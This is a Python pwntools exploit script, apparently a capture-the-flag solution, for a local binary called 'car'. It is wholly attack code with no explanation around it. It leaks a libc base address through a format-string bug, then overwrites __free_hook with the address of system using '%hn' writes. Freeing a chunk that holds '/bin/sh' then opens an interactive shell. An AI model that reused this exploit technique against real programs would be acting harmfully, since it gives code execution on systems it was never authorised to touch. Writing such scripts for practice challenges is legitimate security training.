from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(idx,size,c='A',tp=1,color=1):
	cmd(1)
	cmd(tp)
	cmd(color)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
	p.sendlineafter(": ",str(idx))
def free(idx):
	cmd(4)
	p.sendlineafter(": ",str(idx))
def edit(idx,size,c='A'):
	cmd(2)
	p.sendlineafter(": ",str(idx))
	cmd(2)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)

def show(idx):
	cmd(3)
	p.sendlineafter(": ",str(idx))
context.log_level='debug'
context.arch='amd64'
libc=ELF('./libc.so')
p=process("./car",env={"LD_PRELOAD":"./libc.so"})
p.sendlineafter(": ","n132")
p.sendlineafter(": ","n132")
add(0,0x100)
add(1,0x8,'/bin/sh\x00')
edit(0,0x100,"%3$p|\x00")
base=int(p.readuntil("|")[:-1],16)-(0x7ffff7b05641-0x7ffff7a21000)
log.warning(hex(base))
libc.address=base
cmd(3)
gdb.attach(p,'b *0x000555555555810')
sys=libc.sym['system']
p1=sys&0xffff
p2=(sys>>16)&0xffff
p3=(sys>>32)&0xffff
def cal(a,b):
	if b>a:
		return b-a
	else:
		return b-a+0x10000
edit(0,0x100,"%{}c%16$hn%{}c%17$hn%{}c%18$hn\x00".format(p1,cal(p1,p2),cal(p2,p3)).ljust(0x30)+p64(libc.sym['__free_hook'])+p64(libc.sym['__free_hook']+2)+p64(libc.sym['__free_hook']+4))
cmd(3)
free(1)
p.interactive()
